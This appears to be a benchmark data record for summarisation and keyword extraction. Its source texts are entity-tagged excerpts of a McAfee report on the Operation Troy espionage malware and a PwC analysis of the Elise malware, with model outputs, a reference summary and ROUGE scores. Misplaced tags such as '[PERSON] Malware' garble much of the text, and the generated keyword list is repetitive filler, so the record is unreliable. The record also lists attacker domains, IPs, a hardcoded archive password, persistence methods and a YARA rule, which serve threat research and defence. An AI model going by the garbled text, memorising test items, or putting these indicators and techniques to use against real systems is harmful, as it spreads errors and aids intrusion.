114719_507_AhnlabUpdateKit , which sits in a temp directory created on the desktop . It is obvious that the attackers were aware of the security product that the target environment used and attempted to make the malware appear as legitimate as possible . AhnlabUpdate drops and runs an additional executable , which is the [ORG] RAT payload that establishes a connection with the control server . Main . EXERunCmd.exeAhnlabUpdate.exe ~ ERC6C8.tmpFigure [CARDINAL] 21 . [ORG] TDrop disguises its presence by appearing to be a security product . [PERSON] Concealment [PERSON] Troy : 2013 Another [ORDINAL] third - generation [PERSON] Troy family [GPE] Trojan is [PERSON] Concealment [PERSON] Troy . This version was compiled from the same directory as the [CARDINAL] 3Rat client found in the victims \u2019 environments on [DATE] March [DATE] 20 . Some components from [ORG] Concealment [ORG] Troy suggest that the source code was originally written in [DATE] 2010 and was later compiled for use in this campaign . The [CARDINAL] 64 - bit component to install the backdoor on the victims \u2019 systems contains an interesting compile path and was [ORDINAL] first created on [DATE] November [DATE] 28 , 2012.C:\\test\\BD_Installer_2010\\x64\\Release\\BD_Installer_2010.pdbThe [QUANTITY] 32 - bit version was compiled [DATE] January [DATE] 23 , [DATE] 2013 , and contained this compile path : Z:\\\\Work\\\\Make Troy\\\\Concealment Troy\\\\Exe_Concealment_Troy(Winlogon_Shell)\\\\SetKey_WinlogOn_Shell_Modify\\\\BD_Installer\\\\Release\\\\BD_Installer.pdbComponentCompile PathBDInstaller1BackdoorEXEBackdoorDLLBDInstaller2MainDropper2Z:\\\\Work\\\\Make Troy\\\\Concealment Troy\\\\Exe_Concealment_Troy(Winlogon_Shell)\\\\SetKey_WinlogOn_Shell_Modify\\\\ BD_Installer\\\\Release\\\\BD_Installer.pdb Z:\\\\Work\\\\Make Troy\\\\Concealment Troy\\\\Exe_Concealment_Troy(Winlogon_Shell)\\\\Concealment_Troy(exe)\\\\Release\\\\ Concealment_Troy.pdb Z:\\\\Work\\\\Make Troy\\\\Concealment Troy\\\\Exe_Concealment_Troy(Winlogon_Shell)\\\\Dll\\\\Concealment_Troy(Dll)\\\\ Release\\\\Concealment_Troy.pdb Z:\\\\Work\\\\Make Troy\\\\Concealment Troy\\\\Exe_Concealment_Troy(Winlogon_Shell)\\\\SetKey_WinlogOn_Shell_Modify\\\\ BD_Installer\\\\Release\\\\BD_Installer.pdb NoneMainDropper3NoneTable [CARDINAL] 6 : Compilation timeline for [PERSON] Concealment [PERSON] Troy . Compile Date ( all 2013 ) [DATE] January [DATE] 23February 4February 22February 22February 22February [CARDINAL] 2315Concealment Troy does not employ real - time [ORG] IRC control as earlier versions did . ( [PERSON] Concealment [PERSON] Troy is a typical HTTP botnet.)Figure [CARDINAL] 22 . [PERSON] Concealment [PERSON] Troy abandons the use of [ORG] IRC for real - time control and uses HTTP as its primary channel . Military Espionage Malware : [PERSON] 2009\u20132013 [PERSON] McAfee [PERSON] Labs has uncovered a sophisticated military spying network targeting [GPE] South [GPE] Korea that has been in operation since [DATE] 2009 . Our analysis shows this network is connected to [LOC] the [LOC] Dark [LOC] Seoul incident . Furthermore , we have also determined that a single group has been behind a series of threats targeting [GPE] South [GPE] Korea since [DATE] October [DATE] 2009 . In this case the adversary had designed a sophisticated encrypted network designed to gather intelligence on military networks . We have confirmed cases of [NORP] Trojans operating through these networks in [DATE] 2009 , [DATE] 2010 , [DATE] 2011 , and [DATE] 2013 . This network was designed to camouflage all communications between the infected systems and the control servers via the [ORG] Microsoft Cryptography API using [ORG] RSA [CARDINAL] 128 - bit encryption . Everything extracted from these military networks would be transmitted over this encrypted network once the malware identified interesting information . What makes this case particularly interesting is the use of automated reconnaissance tools to identify what specific military information internal systems contained before the attackers tried to grab any of the files . [DATE] August [DATE] 21 , [DATE] 2010 Military AttacksOctober [DATE] 21 , [DATE] 2009 [DATE] Military Attackstake.chu.jpseung.ussarangbang.uschristkingchurch.usJanuary [DATE] 13 , [DATE] 2013 Military AttacksFebruary [DATE] 28 , 2011Military Attacksdjuna.cine21.comstrider.pe.krdochang.pe.krkairoshairstory.com.auejiweb.comdennisoneil.netdaeilho.netFigure [CARDINAL] 23 . Encrypted data exfiltration network.16The attacks would have occurred in [CARDINAL] four general stages:\u2022 Initial compromise via a \u201c watering - hole attack , \u201d which would lead to the exploitation of the internal systems ( in the [DATE] 2009 case ) . ( The attacker placed a zero - [DATE] day exploit on a military social networking site . ) Later cases were likely spear phishing to more quickly get to the right targets.\u2022 [PERSON] Malware automatically performs recon on target systems looking for documents of interest . [ORG] Malware can also scrape outpasswords and registry information along with directory listing of interesting files.\u2022 The attacker can request directory contents from infected systems based on the number of interesting files found . Canselectively grab specific files as needed.\u2022 Stolen files are transmitted via HTTP - encrypted channel to the attacker \u2019s server . The encrypted network The attacker \u2019s encrypted network uses [ORG] Microsoft \u2019s Cryptography API library Version [CARDINAL] 1.0 to encrypt communication channels to the control servers over both HTTP and [ORG] IRC . The encryption uses a [CARDINAL] 128 - bit [ORG] RSA key , shown as imported and used by the following code . Figure [CARDINAL] 24 . Function to call the Cryptography API library.17Figure [CARDINAL] 25 . RSA encryption key used to camouflage communications . This network operates over both HTTP and uses [ORG] IRC as secondary channel for real - time operations . The [ORG] IRC network is based on the open - source library libircclient5 and everything sent over this [ORG] IRC channel is encrypted via the Cryptography API.Figure [CARDINAL] 26 . Establishing an [ORG] IRC channel session . The following commands are supported by [ORG] IRC to control infected systems in real time . This functionality enables the attacker to send and receive files on demand and execute remote commands . The messages sent between client and servers are base64 encoded and then encrypted using the Cryptography API ; thus a message must be decoded and decrypted to be visible . This highly sophisticated method provides for great flexibility over a secure encrypted channel that is not SSL.\u2022 Get bot version and uptime \u2022 Get directory file listing , all drives or from specific path \u2022 Stop activities for a given period \u2022 [PERSON] Download file \u2022 Send local file to the server \u2022 Execute shell command \u2022 Connect to [ORG] IRC server \u2022 Change nick ( [ORG] IRC ) \u2022 Join channel ( [ORG] IRC ) \u2022 [ORG] IRC disconnect \u2022 Remove bot from system18Figure [CARDINAL] 27 . Functions for [ORG] IRC commands . The HTTP portion is designed to get configuration data used in the [ORG] IRC botnet and to send stolen documents back to the control server . Figure [CARDINAL] 28 . HTTP Get command with parameters.19Figure [CARDINAL] 29 . HTTP Get command continued . Figure [CARDINAL] 30 . HTTP Get command continued.20The encrypted network operates by scanning infected systems and categorizing those systems that contain interesting documents . The malware does not extract every document that is found as a match through drive scanning ; rather it assigns a unique signature to the infected system according to what it contains . Less interesting systems are less likely to have documents extracted from them . The directory contents are uploaded to the attacker \u2019s server , which lets the attacker grab documents at will and keeps the amount of network traffic low . Data exfiltration The theft of classified information is the primary purpose of this network and would occur through drive scanning . Drive scanning locates classified information on target systems and gives the attacker an overall idea of what these military networks have . The malware searches the root disk , counts the number of interesting files , and determines the level of that system \u2019s importance to the attacker . The search criteria are primarily specific file extensions and keywords in document titles . The keywords are all military specific . Some refer to specific military units and programs that operate in [GPE] South [GPE] Korea . This function would determine only the number of interesting files that are contained on any given system ; another function would extract the list of files that match these search criteria . Figure [CARDINAL] 31 . The drive scan function.21In addition to searching for [LANGUAGE] English keywords , the function searches for [ORG] Korean [ORG] ASCII characters that represent a subset of military terms . Most keywords specific to military operations in [GPE] South [GPE] Korea are in [LANGUAGE] English . There is also a set of abbreviations . Figure [CARDINAL] 32 . Google translation of [ORG] ASCII characters.22The files to be sent to the attacker \u2019s server are zipped using the open - source [PERSON] Zip Utils.6 The component uses the password \u201c dkwero38oerA^t@ # . \u201d We have consistently found this password in the malware dating back to [DATE] 2009 . It is used primarily to archive items to be stolen from infected systems . Figure [CARDINAL] 33 . The function to zip stolen documents . The [ORG] DLL relationship In all of these threats we have seen the consistent use of [ORG] bs.dll , a stripped down version of ip6ld.dll , which we have found in the military espionage cases . We can connect not only similar functions within [ORG] bs.dll from [DATE] 2011 to date with those of the military cases in [DATE] 2009 and [DATE] 2010 , but also the shared encryption key for zipping classified information to be sent to the control server . This ip6ld.dll is the same as another file , ~81923.dll ; both operate in the same manner . [ORG] Bs.dll appears to be used primarily for [ORG] IRC botnet communications . The component [ORG] bs.dll has been seen in a number of Troy - era malware samples : [PERSON] Chang , EagleXP , [ORG] NSTAR , [PERSON] Mail [PERSON] Attack , HTTP Troy , Tong , Http Dr0pper , etc . The file Ip6ld.dll , which contains much of the logic described in these attacks , shares a number of common functions with [ORG] bs.dll , including the zip encryption password . In addition , the [ORG] IRC and encryption functions are the same in both files , indicating they were built by the same individual or group . The [CARDINAL] two functions are likely the same source code in different versions . The primary difference between them is bs.dll \u2019s lack of searching for specific extensions and terms that Ip6ld.dll and ~81923.dll contain . This suggests [ORG] bs.dll requires a [ORDINAL] second module and we have seen that with the Mail Attack variant , compiled in [DATE] February [DATE] 2011 , which contained both [ORG] bs.dll and [ORG] payload.dll , with the latter containing the military - specific search and extraction functions.23Figure [CARDINAL] 34 . The [ORG] bs.dll function to scan all drives based on a specified extension . The following function found in [ORG] bs.dll lists the contents of specified directories and zips those contents into an archive file with a password . This function does n\u2019t have any criteria and is likely disabled in some cases , such as with HTTP Troy , which downloads a payload module to search for data . Figure [CARDINAL] 35 . A [ORG] bs.dll function to list and send directory contents.24Figure [CARDINAL] 36 . A [ORG] bs.dll function to send directory contents to remote server.Payload.dll appears to combine both drive searching and directory listing into a single function . A separate action puts the directory contents into a separate file and prepares it to be sent to the remote server . Figure [CARDINAL] 37 . A payload.dll drive - search function.25Figure [CARDINAL] 38 . A function to zip contents.26Relationships to Http Dr0pper We have determined that some variants of [PRODUCT] Http [PRODUCT] Dr0pper will execute payload32.dll , which is essentially the same [ORG] DLL that is found in [ORG] TDrop . This component contains military keywords . [CARDINAL] One variant of [PRODUCT] Http [PRODUCT] Dr0pper made use of payload32 . dll , which was compiled on [DATE] August [DATE] 23 , [DATE] 2012 . The [ORG] TDrop version was compiled [DATE] January [DATE] 13 , [DATE] 2013 . This consistency confirms further that the operations against [GPE] South [GPE] Korea are primarily focused on military intelligence gathering and have attempted to break in since 2009.Destroying the target The espionage malware has the capability to destroy systems in the same way that the [DATE] March [DATE] 20 , [DATE] 2013 , attacks disabled [CARDINAL] thousands of systems in [GPE] South [GPE] Korea . This capability could be devastating if military networks were to suddenly be wiped after an adversary had gathered intelligence . This was clearly the case with the [DATE] March [DATE] 20 [PERSON] Dark [PERSON] Seoul incident , in which we confirmed that the [CARDINAL] 3Rat [ORG] Trojan gained access prior to the [ORG] MBR - wiping event . There was [CARDINAL] at [CARDINAL] least [CARDINAL] one limitation , however : We found the malware of [DATE] February [DATE] 2011 could wipe its targets only if it detected that it was being debugged or analyzed by a security product . Figure [CARDINAL] 39 . The malware \u2019s function to wipe the MBR.27The campaigns Through our research we have discovered a number of distinct subcampaigns as part of the overall [ORG] Operation [ORG] Troy , which has targeted military forces in [GPE] South [GPE] Korea to extract classified information . These operations were designed to occur in [DATE] 2009 through [DATE] 2013 . Recently we uncovered evidence to suggest that they continued just prior to Dark Seoul . We can link the actor(s ) responsible for Dark Seoul to these particular espionage campaigns through various technical means.\u2022 The Troy - era malware is based on the same source code to create these specialized versions ( components shared overthe [PERSON] years).\u2022 The zip encryption password is found in almost all instances , with the exception of [PERSON] Concealment [PERSON] Troy . \u2022 Consistent terms in the malware compile paths ( for example , Troy , Work , etc . ) . \u2022 The same [ORG] IRC botnet channel and encryption method are used throughout the variants . \u2022 Military keywords are consistently found through the components spanning [CARDINAL] 2009\u20132013 , confirming the intent ofthis adversary.\u2022 Use of the same string - obfuscation techniques in the [CARDINAL] 2009\u20132010 campaigns and the [CARDINAL] 2012\u20132013 campaigns . [PERSON] Malware from [CARDINAL] 2009Military [PRODUCT] AttacksMalware from [CARDINAL] 2010Military [PRODUCT] AttacksMalware from [CARDINAL] 2011Military [ORG] AttacksMalware from [CARDINAL] 2012Military [PRODUCT] AttacksMalware from [CARDINAL] 2013Military Attacksdkwero38oerA^t@#Mail [ORG] AttackHTTP [NORP] TroyNSTARChangEagleXPHttp Dr0pperTongTDropFigure [CARDINAL] 40 . Shared encryption password . Conclusion McAfee Labs can connect [LOC] the [LOC] Dark [LOC] Seoul and other government attacks to a secret , long - term campaign that reveals the true intention of [LOC] the [LOC] Dark [LOC] Seoul adversaries : attempting to spy on and disrupt [GPE] South [GPE] Korea \u2019s military and government activities . The Troy - era malware is based on the same source code used to create these specialized variants and shares many commonalities , such as [ORG] bs.dll and [ORG] payload.dll , which are found consistently throughout the families . The attackers have attempted since [DATE] 2009 to install the capability to destroy their targets using an MBR wiper component , as seen in [LOC] the [LOC] Dark [LOC] Seoul incident . From our analysis we have established that [ORG] Operation [ORG] Troy had a focus from the beginning to gather intelligence on [NORP] South [NORP] Korean military targets . We have also linked other high - profile public campaigns conducted over [DATE] the [DATE] years against [GPE] South [GPE] Korea to [GPE] Operation [GPE] Troy , suggesting that a single group is responsible.28About the Authors [PERSON] Ryan [PERSON] Sherstobitoff is a threats researcher with [ORG] McAfee [ORG] Labs . Formerly , he was Chief Security Strategist at [ORG] Panda [ORG] Security , where he managed the [GPE] US strategic response for new and emerging threats . [ORG] Sherstobitoff is widely recognized as a security and cloud computing expert . [PERSON] Itai [PERSON] Liba is a senior security researcher with [ORG] McAfee [ORG] Labs . He is a member of the botnet research team . [GPE] Itai has worked in mobile vulnerability research as well as large - scale reverse - engineering projects and display driver development . He has [DATE] more [DATE] than [DATE] 10 [DATE] years of experience in reverse engineering . [PERSON] James [PERSON] Walter is the director of [ORG] Global [ORG] Threat [ORG] Intelligence [ORG] Operations and manages [ORG] the [ORG] McAfee [ORG] Threat [ORG] Intelligence [ORG] Service ( [ORG] MTIS ) for [ORG] the [ORG] Office [ORG] of [ORG] the [ORG] CTO . He focuses on new threats research as well as the cataloging and maintenance of vulnerabilities and associated countermeasures . [PERSON] Walter has been with McAfee for more than 14 years and leads a global team of threats analysts who create [ORG] Security [ORG] Advisories , countermeasure / detector feeds , [ORG] Global [ORG] Threat [ORG] Intelligence apps , and more . He is a frequent speaker at industry events and conferences , and cohosts \u201c AudioParasitics \u2014 [WORK_OF_ART] The [WORK_OF_ART] Official [WORK_OF_ART] Podcast [WORK_OF_ART] of [WORK_OF_ART] McAfee [WORK_OF_ART] Labs . \u201dAbout McAfee Labs McAfee Labs is the global research team of [PERSON] McAfee . With the only research organization devoted to all threat vectors \u2014 malware , web , email , network , and vulnerabilities \u2014 [ORG] McAfee [ORG] Labs gathers intelligence from its [CARDINAL] millions of sensors and its cloud - based service [ORG] McAfee [ORG] Global [ORG] Threat [ORG] Intelligence . \u2122 The McAfee Labs team of [CARDINAL] 500 multidisciplinary researchers in [CARDINAL] 30 countries follows the complete range of threats in real time , identifying application vulnerabilities , analyzing and correlating risks , and enabling instant remediation to protect enterprises and the public . url [ORG] McAfee [ORG] McAfee , a wholly owned subsidiary of [ORG] Intel [ORG] Corporation ( NASDAQ : [PERSON] INTC ) , empowers businesses , the public sector , and home users to safely experience the benefits of the Internet . The company delivers proactive and proven security solutions and services for systems , networks , and mobile devices around the world . With its visionary [ORG] Security [ORG] Connected strategy , innovative approach to hardware - enhanced security , and unique global threat intelligence network , [ORG] McAfee is relentlessly focused on keeping its customers safe . url url [CARDINAL] 2 url [CARDINAL] 3 url [CARDINAL] 4 url [CARDINAL] 5 url [CARDINAL] 6 url the [PERSON] McAfee logo , and [ORG] Global [ORG] Threat [ORG] Intelligence are registered trademarks or trademarks of [ORG] McAfee , [ORG] Inc. or its subsidiaries in [GPE] the [GPE] United [GPE] States and other countries . Other marks and brands may be claimed as the property of others . The product plans , specifications and descriptions herein are provided for information only and subject to change without notice , and are provided without warranty of any kind , express or implied . Copyright \u00a9 2013 [ORG] McAfee , [ORG] Inc. [CARDINAL] 60254wp_operation - troy_0713_fnl_ETMG", "generated_text": "the report; McAfee Labs; the report; Operation Troy; South Korea; the wipers; The malware; a payload; the MBR; the wiper component; the payload; commands; files; the MBR wiper; the wiper component; scripts; the command; command; control; the attackers; their command; control; the system; the attackers; the attackers; their tactics; the MBR wipers; the malware; Http Dr0pper; details; the attacker; control; the wiper; April; 2013; the command; the network; the wiper; the malware; the C2; the C2; data exfiltration; the DLL; connections; the attackers; the target; the wipers; the C2; the function; the C2; systems; the C2; the C2; the C2; the attackers; the C2; the C2; the C2; the C2; the C2; this campaign.", "ref_text": "<START-1>The document analyzes an cyberespionage operation called Operation Troy that targeted South Korea from 2009-2013. The operation involved various malware tools and tactics to infiltrate South Korean military and government networks to steal classified information. It started with a watering hole attack in 2009 that exploited a military social networking site. Later attacks likely involved spear-phishing. The malware used included remote access Trojans (RATs) like NSTAR, HTTP Troy, Tong, and TDrop which connected to command and control servers via encrypted IRC channels. The RATs scanned infected systems for interesting files and military keywords. Directory listings were sent to the C&C servers so attackers could selectively steal files. The RATs had wiper components that could destroy systems by wiping the MBR, as seen in the Dark Seoul incident in 2013. The various RAT versions reused code and components like bs.dll and payload.dll over the years, confirming the same group's involvement. Encryption, IRC nicknames, directory paths, and other tactics were consistent across the malware versions from 2009-2013. The campaign targeted military networks to gather intelligence. The stolen data was exfiltrated over an encrypted network. Two groups claimed responsibility - NewRomanic Cyber Army Team and Whois Hacking Team - but they appear to be a fabrication to hide the real threat actor. In summary, Operation Troy was a long-running cyberespionage campaign that relied on malware and encryption to infiltrate and steal military secrets from South Korea likely for strategic purposes. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.41000000000000003, "gpt3/lexical/rouge_rouge2": 0.09547738693467336, "gpt3/lexical/rouge_rougeL": 0.19, "gpt3/lexical/rouge_rougeLsum": 0.19, "gpt3_generated_text": ["This article from McAfee Labs provides a detailed analysis of Operation Troy, a cyberespionage campaign that targeted South Korea from 2009 to 2013. The report outlines the timeline of the attacks, which culminated in a major cyberattack on March 20, 2013, causing significant damage to the affected organizations. The analysis suggests that there were two distinct groups involved in the attacks, with evidence indicating that they had access to the environments prior to launching the wiping component. The report also investigates the possibility of state sponsorship or cyberterrorism, concluding that the true source of the attacks was masked by fabricated claims of responsibility. The article provides details on the malware used in the campaign, including a dropper Trojan, an MBR wiper, and a remote-access Trojan. It also explores the relationships between the various components and the attackers' command and control infrastructure. The report concludes with an overview of the campaigns and the likely motivations behind them."]}, {"split_name": "test", "sample_id": "test_71", "prompt_text": "Extract the keywords: ELISE : Security Through Obesity [DATE] 23 [DATE] December 2015By [PERSON] Michael [PERSON] Yip Executive Summary [GPE] Taiwan has long been subjected to persistent targeting from espionage motivated threat actors . This blog presents our analysis of [CARDINAL] one of the latest malware variants targeting individuals in [GPE] Taiwan , which exhibits some interesting characteristics that can be useful for detecting and defending against the threat \u2013 including the creation of an obese file , weighing in at [CARDINAL] 500 [ORG] MB , as part of its execution . [PERSON] Malware [PERSON] Analysis The sample which caught our attention for this analysis is a [ORG] PowerPoint slideshow file named \u2f63 .pps ( translation : \u201c Observations on cyber compensated dating among [NORP] Taiwanese students \u201d ) . The sample was submitted to [ORG] VirusTotal on [DATE] 3rd [DATE] December [DATE] 2015 from [GPE] Taiwan and at the time was only detected by [CARDINAL] 3 out of [CARDINAL] 54 antivirus vendors as malicious . An exploit for CVE-2014 - 4114 is also detected and tagged by [ORG] VirusTotal . Figure [CARDINAL] 1 : The sample is a [ORG] PowerPoint file with exploit for CVE-2014 - 4114 embedded . The initial lure The figures below show some of the slides from the slideshow . All the contents in the slideshow are written in [NORP] Traditional [NORP] Chinese , which is typically used in provinces in [LOC] Southern [LOC] China such as [GPE] Guangdong and [GPE] Hong [GPE] Kong , as well as [GPE] Taiwan . Since the topic of the slideshow relates explicitly to [NORP] Taiwanese and the submission was from [GPE] Taiwan , we assess the attacker was likely targeting [NORP] Taiwanese individuals . [PERSON] Email [PERSON] alerts [PERSON] Join [DATE] today to receive email alerts when we publish new articlesSearch the siteSearch our archiveArticles by categoryArticles by monthLatest posts from Cyber security updatesELISE : Security Through ObesityWhy 2015 was the tipping point for cybersecurity#PrivateBizChat : Cybersecurity - 15 December , [DATE] 12.30pm [DATE] - [DATE] 1.30pmWe are not one , we are manyIngredients for Consumer SecurityIt wo n\u2019t happen to us : An optimistic outlook on breachesIs threat intelligence the key to realising cyber insurance potential?UnityGhost : the ghost adventure continuesCyber security in engineering and constructionA tale of [GPE] Pirpi , [ORG] Scanbox [ORG] & CVE-2015 - 3113Cyber security Building confidence in your digital futureFigure [CARDINAL] 2 : The lure document is a Powerpoint ( .pps ) slideshow on \u201c Observations into cyber compensated dating ( ) among [NORP] Taiwanese students\u201d . Given the use of a malicious document as the initial lure , the delivery method in this campaign is almost certainly spear - phishing . Exploitation Once the slideshow file is opened , whilst the slides are displayed in full screen mode , the malware is dropped in the background . Specifically , [CARDINAL] two files are dropped into the % TEMP% directory : hlwyss.jpg and hlwyss.inf . By examining the file header ( as shown in Figure [CARDINAL] 3 ) of hlwyss.jpg , we can see that the file is in fact a MS - DOS executable : Breach aid Are you suffering a cyber , privacy or data breach?Data protection and privacy global insights [ORG] blog2015 [ORG] Information security breaches surveyThe results are inFigure [CARDINAL] 3 : File header of hlwyss.jpg shows it 's an MS - DOS executable . The hlwyss.inf is an [ORG] INF file which specifies file system operations required to install the malware ( as shown in Figure [CARDINAL] 4 ) . The use of an embedded [ORG] INF file for malware installation is consistent with the [GPE] Metasploit implantation of CVE-2014 [CARDINAL] - 4114 , better known as the \u2018 Sandworm \u2019 vulnerability . Figure [CARDINAL] 4 : Contents of the hlwyss.inf which shows the renaming of hlwyss.jpg to hlwyss.dll and installation of the [PRODUCT] RunOnce key for malware execution . As indicated in the [ORG] INF file , the installation script renames hlwyss.jpg to hlwyss.dll and sets up the malware through the creation of [CARDINAL] two [PRODUCT] RunOnce keys to ensure the execution of the malicious [ORG] DLL using rundll32.exe , with the entry point Setting . Installation and execution On examining logs produced during execution by ProcessMonitor , we find that aside from following the instructions outlined in the [ORG] INF file , the malware proceeds to perform additional operations to complete its installation . In particular , the malware replicates itself in the % AppData%\\Roaming\\Programs folder and names its cloned copy \u2018 Syncmgr.dll \u2019 ( see Figure [CARDINAL] 5).Figure [CARDINAL] 5 : As part of the installation , another [ORG] DLL called [ORG] Syncmgr.dll is also created . To ensure persistence on future restarts a [PERSON] Run key is also installed , however , the [PERSON] Run key points to the newly created [ORG] Syncmgr.dll rather than the original hlwyss.dll . Figure [CARDINAL] 6 : Run and [PRODUCT] RunOnce keys installed to ensure malware execution on boot up . Planting the malware in the user \u2019s AppData\\Roaming folder is also a sign that the attacker was likely to be targeting corporate users as corporate users often possess roaming user profiles , a [PRODUCT] Windows feature that allows users to access their customised Windows environment from different machines . As [ORG] Syncmgr.dll is the main malicious payload , we took a closer look at the file . The malware was compiled on [CARDINAL] 24 th [DATE] November [DATE] 2015 and it is a 32 [QUANTITY] - bit [ORG] DLL . This shows that the sample is recent and indicates the threat actor is currently active . Examining the PE structure of [ORG] Syncmgr.dll shows a hidden executable embedded as one of the resources : Figure [CARDINAL] 7 : Executable embedded in resource . Once SyncManager.dll is executed , an iexplore.exe process is spawned : Figure [CARDINAL] 8 : A malicious iexplore.exe process spawned . Unsurprisingly , the strings of the iexplore.exe process reveals that the malware has injected itself into the process . Figure [CARDINAL] 9 : [PERSON] Malware injected into iexplore.exe . By visualising the ProcessMonitor logs in ProcDOT , we see that [CARDINAL] two more files are created by the malware : WEB2013BW6.DAT and [CARDINAL] 60HGBC00.DAT.Figure [CARDINAL] 10 : [PERSON] Malware creates [CARDINAL] two addition .DAT files . By comparing the code constructs between the embedded resource [ORG] ASDASDASDASDSAD and [GPE] WEB2013BW6.DAT , we see that they contain the identical code , as shown below : Figure [CARDINAL] 11 : The embedded resource ( left ) and [PERSON] WEB2013BW6.DAT have similar code constructs . However , [GPE] WEB2013BW6.DAT is over 500 MB in size which is significantly larger than [ORG] ASDASDASDASDSAD which is only 51 [PERSON] KB in size : Figure [CARDINAL] 12 : Dropped files in AppData\\Roaming\\Programs folder . An examination into the [ORG] PE structure of WEB2013BW6.DAT shows that a significant amount of junk characters are appended to the foot of the file : Figure [CARDINAL] 13 : Padding towards the end of WEB2013BW6.DAT.Based on its contents , the .DAT file is likely a component responsible for network communication . [ORG] ProcMon logs also show that only once the iexplore.exe process is spawned , that the .DAT file is loaded into the process . Our current hypothesis is that this is component of the malware often triggers antivirus signatures , and its huge size is an effort by the authors to evade detection . Network communications Once the malware is executed , a HTTP GET request is sent to showip[.]net in an attempt to find out the victim \u2019s external [ORG] IP address . Figure [CARDINAL] 14 : HTTP GET request to showip[.]net . After obtaining the [ORG] IP address , the malware then sends out a HTTP GET request to [CARDINAL] one of [CARDINAL] three command [NORP] & control ( C2 ) servers configured in the malware , such as ustar5.PassAs[.]us . The full HTTP headers are as shown in the figure below : Figure [CARDINAL] 15 : Network traffic to ustar5.PassAs[.]us generated after the malware is executed . There are [CARDINAL] two interesting aspects to the observed HTTP traffic . [ORDINAL] Firstly , the user - agent is hardcoded in the malware and as shown in the above figures , the same user - agent is used in both GET requests . [ORDINAL] Secondly , the victim [ORG] IP is stored as the SHO value in the cookie field in the HTTP GET request to the [CARDINAL] C2 server . Both characteristics are useful in a .tmp log file stored in the % TEMP% directory : Figure [CARDINAL] 16 : Log file generated by the malware during execution logging failed attempts at establishing contact with configured C2s . Functionalities By examining the code constructs in the malware , we found evidence of the following functions : File upload \u2013 upload file to server File download \u2013 download file to victim machine Remote shell \u2013 spawn remote shell File system reconnaissance \u2013 obtain file metadata data Process enumeration \u2013 enumerate running processesSome of these functionalities are visible in the [ORG] ASCII strings from the embedded payload [ORG] ASDASDASDASDSAD : Figure [CARDINAL] 17 : Strings from the malware show hints on the functionalities offered by the malware . Association with LOTUS BLOSSOM Our [ORDINAL] first step in attempting to tie activity to known campaigns is to look for any infrastructure overlaps between the domains used and those used previously by known threat actors , however we were unable to identify any infrastructure overlap in this case . However , network infrastructure is not the only method for attribution . Other useful methods include common tools and techniques used by threat actors , as well as any other behavioural patterns in the modus operandi associated with specific threat actors . In this case , we believe the sample analysed is associated with the \u2018 Lotus Blossom \u2019 threat actor based on the following characteristics which are also seen in other samples associated with the actor : The use of [ORG] Microsoft [ORG] Office document with content in [NORP] Traditional [NORP] Chinese as initial lure and exploit ; The targeting of [NORP] Taiwanese individuals ( [GPE] Taiwan is often the target of the Lotus [PERSON] Blossom group ) ; The malware is written in [LANGUAGE] C++ ( like most other malware used by the Lotus [PERSON] Blossom threat actor ) ; The mention of [ORG] Loader.dll ( a filename referenced in other Elise samples ) ; The use of dynamic [ORG] DNS domains , including use of the same providers ; The fixed user - agent [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 7.0 ; [EVENT] Windows [EVENT] NT [EVENT] 5.1 ) ; [ORG] Mutex string Global\\{7BDACDEE-8BF6 - 4664 - B946 - D00FCFF1FFBA } ; The format of the configuration for the [CARDINAL] C2 servers ( e.g. Server1=%s ) ; and ; The presence of a JSON - like string within the malware matching the following regular expression : \\ { \\\"r\\\":\\\"[0 [PERSON] - 9]{12}\\\",\\\"l\\\":\\\"[0 [PERSON] - 9]{12}\\\",\\\"u\\\":\\\"[0 [PERSON] - 9]{7}\\\",\\\"m\\\":\\\"[0 [PERSON] - [PERSON] 9 ] { [DATE] 12}\\\"\\}.These relationships are displayed graphically in the [ORG] Maltego graph below : Figure [CARDINAL] 18 : Some overlapping features among related samples , including the sample analysed in this blog- [GPE] Taiwan has long been heavily targeted by espionage threat actors and \u2018 Lotus [PERSON] Blossom \u2019 is one of the most active threat actors currently targeting the country . The analysis presented in this blog provides an overview of [CARDINAL] one of their latest malware variants and new network infrastructure associated with the group . The compile time of the sample shows that the malware was compiled in [DATE] November which indicates that the group is still actively targeting [NORP] Taiwanese victims . Recommendation To help detect the presence of the malware described in this blog , we have included both network and host based signatures in the [LOC] Appendix . Further Information We specialise in providing the services required to help clients resist , detect and respond to advanced cyber attacks . This includes crisis events such as data breaches , economic espionage and targeted intrusions , including those commonly referred to as APTs . If you would like more information on any of the threats discussed in this alert please feel free to get in touch , by e - mailing threatintelligence@uk.pwc.com . [PERSON] Michael [PERSON] Yip | Cyber Threat Detection & Response +44 ( 0)20 [CARDINAL] 78043900Appendix File descriptions Below are the network indicators referenced in this blog : DomainDomainIPIPustar5.PassAs[.]usdnt5b.myfw[.]us203.124.14[.]241103.193.150[.]33Detection signatures [PERSON] Yara rule [ORG] Lightserver_variant_B : Red_Salamander description = \" Elise lightserver variant . \" author = \" [WORK_OF_ART] PwC [WORK_OF_ART] Cyber [WORK_OF_ART] Threat [WORK_OF_ART] Operations : : @michael_yip \" version = \" [CARDINAL] 1.0 \" created = \" [DATE] 2015 [DATE] - [DATE] 12 [DATE] - [DATE] 16 \" $ json = /\\{\\\"r\\\":\\\"[0 - 9]{12}\\\",\\\"l\\\":\\\"[0 - 9]{12}\\\",\\\"u\\\":\\\"[0 - 9 ] { 7}\\\",\\\"m\\\":\\\"[0 - 9]{12}\\\"\\}/ $ mutant1 = \" Global\\\\{7BDACDEE-8BF6 - 4664 - B946 - D00FCFF1FFBA } \" $ mutant2 = \" { 5947BACD-63BF-4e73 - 95D7 - 0C8A98AB95F2 } \" $ serv1 = \" Server1=%s \" $ serv2 = \" Server2=%s \" $ serv3 = \" Server3=%s \" condition : uint16(0 ) = = [CARDINAL] 0x5A4D and ( $ json or $ mutant1 or $ [ORG] mutant2 or all of ( $ serv * ) ) description = \" Elise lightserver variant . \" author = \" [WORK_OF_ART] PwC [WORK_OF_ART] Cyber [WORK_OF_ART] Threat [WORK_OF_ART] Operations : : @michael_yip \" version = \" [CARDINAL] 1.0 \" created = \" [DATE] 2015 [DATE] - [DATE] 12 [DATE] - [DATE] 16 \" uint16(0 ) = = [CARDINAL] 0x5A4D and for any i in ( 0 pe.number_of_resources - 1 ) : ( pe.resources[i].type_string = = \" [WORK_OF_ART] 